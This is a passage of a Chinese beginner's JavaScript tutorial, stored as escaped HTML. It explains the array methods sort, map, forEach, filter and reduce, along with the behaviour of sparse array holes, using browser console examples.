'word']\u003c/code\u003e是因为\n\u003ccode\u003e'Word'\u003c/code\u003e的Unicode编码是\\u0026\\u0023\\u0033\\u0039\\u003b\\u0057\\u006f\\u0072\\u0064\\u0026\\u0023\\u0033\\u0039\\u003b\n\u003ccode\u003e'word'\u003c/code\u003e的Unicode编码是\\u0026\\u0023\\u0033\\u0039\\u003b\\u0077\\u006f\\u0072\\u0064\\u0026\\u0023\\u0033\\u0039\\u003b\n所以   \u003ccode\u003e'Word'\u003c/code\u003e排在\u003ccode\u003e'word'\u003c/code\u003e前面。\n各种编码查询\u003ca target=\"_blank\" href=\"http://tool.chinaz.com/tools/unicode.aspx\"\u003e站长工具\u003c/a\u003e\n\u003cstrong\u003esort方法明显的会改变原数组啊\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e我们通常不想使用默认的升序排列，sort方法可以传入函数来改变顺序。\nMDN的语法是arr.sort(compareFunction)\n\u003ccode\u003ecompareFunction\u003c/code\u003e这个函数用来指定按某种顺序进行排列的函数。如果省略，元素按照转换为的字符串的诸个字符的Unicode位点进行排序。\n\u003ccode\u003ecompareFunction\u003c/code\u003e这个函数基本的规则是传入两个参数\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e compareNumbers(a, b) {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e a - b;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003ea,b参数比较\u003c/th\u003e\n\u003cth\u003e代表的意思\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003ecompareFunction(a, b) \u0026lt; 0\u003c/td\u003e\n\u003ctd\u003ea在b之前\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ecompareFunction(a, b) \u0026gt; 0\u003c/td\u003e\n\u003ctd\u003eb在a之前\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a = [1, 20, 30, -7]\nundefined\na\n(4) [1, 20, 30, -7]\na.sort(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(a,b){\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e b\u003cspan class=\"hljs-_\"\u003e-a\u003c/span\u003e})\n(4) [30, 20, 1, -7]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e降序排列。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e也可以根据具体需求来根据属性来排列\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar students = [\u003cspan class=\"hljs-string\"\u003e'小明'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'小红'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'小花'\u003c/span\u003e];\n var scores = { 小明: 59, 小红: 99, 小花: 80 }; \nstudents.sort(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(a, b){\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e scores[b] - scores[a]\n});\n(3) [\u003cspan class=\"hljs-string\"\u003e\"小红\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"小花\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"小明\"\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以上是把三个学生根据成绩从大到小排列的\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e5.2 map()\u003c/h4\u003e\n\u003cp\u003emap() 方法创建一个新数组，其结果是该数组中的\u003cstrong\u003e每个元素\u003c/strong\u003e都调用一个提供的函数后返回的结果。\n\u003cstrong\u003e不影响原数组。\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [\u003cspan class=\"hljs-string\"\u003e'aa'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'bb'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'cc'\u003c/span\u003e]\narr.map(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(value){\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e value = value + \u003cspan class=\"hljs-string\"\u003e\"f\"\u003c/span\u003e\n})\n(3) [\u003cspan class=\"hljs-string\"\u003e\"aaf\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"bbf\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"ccf\"\u003c/span\u003e]\narr\n(3) [\u003cspan class=\"hljs-string\"\u003e\"aa\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"bb\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"cc\"\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以上代码中map()方法里面传入的函数是一个把数组每个值都加上一个'f'。\n每个元素末尾都加上一个'f'，然后返回这个新的数组，原数组没有任何变化的。\n我初学的时候，看到上述代码反正很懵逼，这玩意咋出来的这个结果呢。琢磨了很久，还是觉得MDN的解释明白，只不过需要看个3、4遍就能明白了。\n语法规范是:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e new_array = arr.map(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e callback(currentValue, index, array) { \n    // Return element \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e new_array \n}[, thisArg])\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003ecallback\n生成新数组元素的函数，使用三个参数：\ncurrentValue\ncallback 的第一个参数，数组中正在处理的当前元素。\nindex\ncallback 的第二个参数，数组中正在处理的当前元素的索引。\narray\ncallback 的第三个参数，map 方法被调用的数组。\nthisArg\n可选的。执行 callback 函数时 使用的this 值。\n返回值\n一个新数组，每个元素都是回调函数的结果。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e[1, 2, 3].map(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(currentValue, index, arr){\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e currentValue*index\n})\n(3) [0, 2, 6]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其实callback 的第三个参数可以不写，也知道调用的到底是哪个Array。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e[1, 2, 3].map(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(currentValue, index){\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e currentValue*index\n})\n(3) [0, 2, 6]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e当你用map()方法的时候，callback 函数会被自动传入三个参数：数组的每一个元素，元素索引，原数组本身。既然原数组本身可以省略，那么由剩下的两个特点我们发散一下，会想到前面我们讲过，伪数组(比如字符串)也具备这两个特点会不会也能用map()方法呢，接下来做个实验。\n哈哈哈哈，愚蠢的人类，你想的美，怎么可能直接使用呢，必须把伪数组转换一下的。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e第一种转换方法\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar upper = \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (str){\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e str.toUpperCase();\n};\n[].map.call(\u003cspan class=\"hljs-string\"\u003e'abc'\u003c/span\u003e, upper)\n(3) [\u003cspan class=\"hljs-string\"\u003e\"A\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"B\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"C\"\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以上是通过map函数的call方法间接使用\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e第二种转换方法\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-string\"\u003e'abc'\u003c/span\u003e.split(\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e).map(upper)\n(3) [\u003cspan class=\"hljs-string\"\u003e\"A\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"B\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"C\"\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003e'abc'.split('')\u003c/code\u003e把字符串转成数组\u003ccode\u003e[\"a\", \"b\", \"c\"]\u003c/code\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e至此，字符串和数组相互转化的方法，都学到了,总结如下。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e数组转字符串 三种方法\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e[1, 3, 4].toString()\n\u003cspan class=\"hljs-string\"\u003e\"1,3,4\"\u003c/span\u003e\n[1, 3, 4] + \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e\n\u003cspan class=\"hljs-string\"\u003e\"1,3,4\"\u003c/span\u003e\n[1, 3, 4].join()\n\u003cspan class=\"hljs-string\"\u003e\"1,3,4\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e字符串转数组 一种方法\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-string\"\u003e'abxc'\u003c/span\u003e.split(\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e)\n(4) [\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"b\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"x\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"c\"\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\u003chr\u003e\n\u003cp\u003e在map()的最后，要注意数组的空位问题。\n我们先看一个map()处理含有空位的数组的奇怪现象\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar f = \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(n){ \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e n + 1 };\nundefined\n[1, , 2].map(f) \n(3) [2, empty, 3]\n[1, undefined, 2].map(f)\n(3) [2, NaN, 3]\n[1, null, 2].map(f)\n(3) [2, 1, 3]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以发现\u003ccode\u003e[1, , 2].map(f)\u003c/code\u003e空位未执行map()。map方法不会跳过undefined和null，但是会跳过空位。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enull + 1 = 1\n\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e + 1 = 2\n\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e + 1 = 1\n//好奇怪\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e用一个更直观的例子来证明map方法会跳过空位\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eArray(2).map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e (){\n  console.log(\u003cspan class=\"hljs-string\"\u003e'enter...'\u003c/span\u003e);\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1;\n})\n(2) [empty × 2]\n    length: 2\n    __proto__: Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e本文一开始就讲了Array[2]始构造了长度为2的空数组，没有打印出enter，说明未执行map()方法。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e使用 map 方法处理数组时，数组元素的范围是在 callback 方法第一次调用之前就已经确定了。在 map 方法执行的过程中：原数组中新增加的元素将不会被 callback 访问到；若已经存在的元素被改变或删除了，则它们的传递到 callback 的值是 map 方法遍历到它们的那一时刻的值；而被删除的元素将不会被访问到。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003cp\u003e以上引入了数组的空位（hole）概念，\u003cstrong\u003e那什么才是数组的空位呢\u003c/strong\u003e\n\u003ccode\u003evar a= [1, , 2]\u003c/code\u003e 中间就是一个空位\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a= [1, , 2]\nundefined\na\n(3) [1, empty, 2]\n    0: 1\n    2: 2\n    length: 3\n    __proto__: Array(0)\na[1]\nundefined\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以看到，空位计入数组长度,空位可读取，但是是undefined。\ndelete命令可以删除数组内的一个元素\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ea\n(3) [1, empty, 2]\ndelete a[0]\n\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\na\n(3) [empty × 2, 2]\n    2: 2\n    length: 3\n    __proto__: Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003edelete命令删除成功，返回true,但是length不变，说明空位可以被读取到，所以用delete命令无法清空数组。目前把数组清空的唯一方法就是把length属性改为0。\n换句话说\u003cstrong\u003elength属性不能过滤空位\u003c/strong\u003e。\n当使用length属性进行数组遍历时，一定要非常小心。\u003c/p\u003e\n\u003cp\u003e数组的某个位置是空位，与某个位置是undefined，是不一样的。\n为什么不一样呢。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e如果是空位，使用数组的forEach方法(接下来重点研究)、for...in结构、以及Object.keys方法进行遍历，空位都会被跳过。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a = [1, , , 5]\nundefined\na\n(4) [1, empty × 2, 5]\n    0: 1\n    3: 5\n    length: 4\n    __proto__: Array(0)\n//只打印出了已经存在具体数值的1和5\na.forEach(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(x){console.log(x)})\n1\n5\nundefined\n//只有0索引和3索引\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (var i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a) {\n  console.log(i);\n}\n0\n3\nundefined\n//只有0索引和3索引\nObject.keys(a)\n(2) [\u003cspan class=\"hljs-string\"\u003e\"0\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"3\"\u003c/span\u003e]\n    0: \u003cspan class=\"hljs-string\"\u003e\"0\"\u003c/span\u003e\n    1: \u003cspan class=\"hljs-string\"\u003e\"3\"\u003c/span\u003e\n    length: 2\n    __proto__: Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e如果是undefined，使用数组的forEach方法(接下来重点研究)、for...in结构、以及Object.keys方法进行遍历，不会被跳过。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a = [undefined, undefined, undefined];\n\na.forEach(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (x, i) {\n  console.log(i + \u003cspan class=\"hljs-string\"\u003e'. '\u003c/span\u003e + x);\n});\n// 0. undefined\n// 1. undefined\n// 2. undefined\n\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (var i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a) {\n  console.log(i);\n}\n// 0\n// 1\n// 2\n\nObject.keys(a)\n// [\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'2'\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面的对比可以知道，空位就是数组没有这个元素，所以不会被遍历到，而undefined则表示数组有这个元素，值是undefined，所以遍历不会跳过。\u003c/p\u003e\n\u003chr\u003e\n\u003ch4 class=\"heading\"\u003e5.3 forEach()\u003c/h4\u003e\n\u003cp\u003e该方法与map()类似，都是使数组的每个元素执行一个函数。与map()的最大区别是没有返回值，而map()返回一个新的数组。forEach()只关心数据的操作，而不关心返回值。forEach()方法传入的函数，实际上是有3个值。\nMDN的语法规范\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earray.forEach(callback(currentValue, index, array){\n\u0026nbsp; \u0026nbsp; //\u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e something\n}, this)\n\narray.forEach(callback[, thisArg])\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e参数列表的含义与map()方法的每个参数含义相同。\ncallback()函数的array参数，通常省略，自己要脑补上。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//x就是数组的每一个元素，i是每一个元素的索引\narr.forEach(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(x, i){\n\u0009console.log(i + \u003cspan class=\"hljs-string\"\u003e': '\u003c/span\u003e + x)\n})\n0: 1\n1: 2\n2: 3\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e谁去调用的forEach()方法，那么callback()里面的array就会自动传入那个数组，但是是隐藏的。和我一样的初学者，都曾怀疑过，哪里传进来的数组呢，最好的答案都在MDN的callback()函数的语法规则里面，具体的细节分析和map()的分析一样。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e注意: 用forEach()方法遍历数组，无法再某个条件时停止遍历，此时应该用普通的for循环\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr1 = [1, 2, 3]\nundefined\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0; i \u0026lt; arr1.length; i++){\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(arr1[i] === 2){\u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;}\n\u0009console.log(i)\n}\n0\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面代码中，执行到数组的第二个成员时，就会中断执行。forEach方法做不到这一点。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e与map()方法一样，forEach方法会跳过数组的空位。而不会跳过undefined和null。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e = \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (n) {\n console.log(n + 1);\n};\n\n[1, undefined, 2].forEach(\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e)\n// 2\n// NaN\n// 3\n\n[1, null, 2].forEach(\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e)\n// 2\n// 1\n// 3\n\n[1, , 2].forEach(\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e)\n// 2\n// 3\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e当然了，forEach方法也可以用于类似数组的对象和字符串。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar obj = {\n  0: 1,\n  a: \u003cspan class=\"hljs-string\"\u003e'hello'\u003c/span\u003e,\n  length: 1\n}\n\nArray.prototype.forEach.call(obj, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (value, i) {\n  console.log( i + \u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e + value);\n});\n// 0:1\n\nvar str = \u003cspan class=\"hljs-string\"\u003e'hello'\u003c/span\u003e;\nArray.prototype.forEach.call(str, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (value, i) {\n  console.log( i + \u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e + value);\n});\n// 0:h\n// 1:e\n// 2:l\n// 3:l\n// 4:o\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对象和字符串使用foreach一定要用Array.prototype.forEach.call()的。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003eforEach\u003c/code\u003e\u0026nbsp;遍历的范围在第一次调用\u0026nbsp;\u003ccode\u003ecallback\u003c/code\u003e\u0026nbsp;前就会确定。调用\u003ccode\u003eforEach\u003c/code\u003e\u0026nbsp;后添加到数组中的项不会被\u0026nbsp;\u003ccode\u003ecallback\u003c/code\u003e\u0026nbsp;访问到。如果已经存在的值被改变，则传递给\u0026nbsp;\u003ccode\u003ecallback\u003c/code\u003e\u0026nbsp;的值是\u0026nbsp;\u003ccode\u003eforEach\u003c/code\u003e\u0026nbsp;遍历到他们那一刻的值。已删除的项不会被遍历到。如果已访问的元素在迭代时被删除了(例如使用\u0026nbsp;\u003ca target=\"_blank\" title=\"shift() 方法从数组中删除第一个元素，并返回该元素的值。此方法更改数组的长度。\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/shift\"\u003e\u003ccode\u003eshift()\u003c/code\u003e\u003c/a\u003e) ，之后的元素将被跳过\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eε=(´ο｀*)))唉，上面这段话啊，可以看出forEach()和map()函数如此的相似啊。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e举一个MDN上面的例子，一旦数组被修改了，遍历不受你的影响\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar words = [\u003cspan class=\"hljs-string\"\u003e\"one\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"two\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"three\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"four\"\u003c/span\u003e];\nwords.forEach(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(word) {\n  console.log(word);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (word === \u003cspan class=\"hljs-string\"\u003e\"two\"\u003c/span\u003e) {\n    words.push(\u003cspan class=\"hljs-string\"\u003e'aaa'\u003c/span\u003e);\n  }\n});\none\ntwo\nthree\nfour\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们发现遍历出了原来的所有元素，在forEach()开始之后的添加的\u003ccode\u003e'aaa'\u003c/code\u003e并不会遍历到。\n不过MDN的例子比我的难度大多了啊。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar words = [\u003cspan class=\"hljs-string\"\u003e\"one\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"two\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"three\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"four\"\u003c/span\u003e];\nwords.forEach(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(word) {\n  console.log(word);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (word === \u003cspan class=\"hljs-string\"\u003e\"two\"\u003c/span\u003e) {\n    words.shift();\n  }\n});\n// one\n// two\n// four\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e当到达包含值\"two\"的项时，整个数组的第一个项被移除了，这导致所有剩下的项上移一个位置。因为元素 \"four\"现在在原数组的第三个位置，three跑到了第二个位置，而此时要去遍历第三个位置，所以不会打印three。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e5.4 filter()\u003c/h4\u003e\n\u003cp\u003efilter方法的参数是一个函数，所有数组成员依次执行该函数，返回结果为true的成员组成一个新数组返回。该方法不会改变原数组。\n通俗的理解就是过滤器。callback()函数与以上两个一样，也是传入三个参数。\n第一个参数是当前数组成员的值，这个是必须的。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [1, 3, 5, 7]\nundefined\narr.filter(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(value){\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e value\u0026gt;5})\n[7]\narr.filter(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(value){\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e value\u0026gt;1})\n(3) [3, 5, 7]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以理解为给filter()传入的函数一个规则，满足规则的才能返回。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e5.5 reduce()\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003ereduce() 方法对累加器和数组中的每个元素（从左到右）应用一个函数，将其减少为单个值。\n以上是MDN的解释，挺难理解字面意思的。直接用实例来理解吧。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e累加求和\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [1, 3, 10, 6] \nundefined\narr.reduce(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(preSum, ele){\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e preSum + ele;\n})\n20\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ereduce()函数传入一个函数作为参数，函数里面传入两个参数，preSum默认是数组的第一个元素，每次都把数组的两个元素相加并返回，ele就是每个数组元素。\n你也快成规定起始的累加值\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr.reduce(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(preSum, ele){\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e preSum + ele;\n}, 10)\n30\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e起始的累加值是10，那么加上数组的20就是30。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e用reduce表示map()\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [1, 3, 4]\nundefined\narr.reduce(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(arr, n){\n\u0009arr.push(n*2)\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e arr\n}, [])//[]空数组作为一个初始值\n(3) [2, 6, 8]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e利用reduce()完成了map()一样的功能\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e用reduce表示filter()\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [1, 3, 4, 10, 30]\nundefined\narr.reduce(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(arr, n){\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(n\u0026gt;3){\n\u0009\u0009arr.push(n)\n\u0009}\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e arr\n}, [])\n(3) [4, 10, 30]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果原数组里面的值大于3,就放到新的数组里面。和filter()道理一样。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e计算数组里面技术的和\nvar a = [1,2,3,4,5,6,7,8,9]\n计算所有奇数的和\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a = [1,2,3,4,5,6,7,8,9]\na.reduce(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(sum, n){\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(n % 2 === 0){\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e sum\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e sum + n\n\u0009}\n})\n25\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e先判断一下，再把奇数相加\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e5.6 几个方法组合使用\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e计算数组的偶数和\n给定一个 数组 var a = [1,2,3,4,5,6,7,8,9]\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e获取所有偶数\u003c/li\u003e\n\u003cli\u003e得到所有偶数的平方\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ea.filter(\u003cspan 